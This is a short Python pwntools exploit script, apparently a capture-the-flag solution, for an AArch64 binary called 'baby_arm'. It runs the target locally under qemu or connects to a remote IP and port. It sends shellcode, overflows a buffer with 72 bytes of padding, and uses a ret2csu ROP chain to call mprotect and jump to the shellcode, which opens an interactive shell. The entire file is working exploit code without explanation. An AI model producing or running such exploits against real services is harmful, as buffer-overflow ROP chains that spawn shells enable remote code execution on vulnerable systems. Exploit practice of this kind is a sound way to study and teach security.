from pwn import *

binary = "./baby_arm"
context.log_level = "debug"
context.binary = binary

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", binary])
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", binary])
elif sys.argv[1] == "r":
    io = remote("106.75.126.171", 33865)
else:
    print "[error] One arg is needed..."

def csu_rop(call, x0, x1, x2):
    payload = flat(0x4008cc,0,0x4008ac,0,1,call,x2,x1,x0,0)
    return payload

if __name__ == "__main__":
    elf = ELF("./baby_arm")
    shellcode_addr = 0x411068
    shellcode = asm(shellcraft.aarch64.sh())
    shellcode = shellcode.ljust(0x30,'\x00')
    shellcode += p64(elf.plt["mprotect"])
    io.recvuntil("Name")
    io.sendline(shellcode)

    payload = "a" * 72
    payload += csu_rop(shellcode_addr+0x30, 0x410000, 0x1000, 5)
    payload += flat(shellcode_addr)
    io.sendline(payload)
    io.interactive()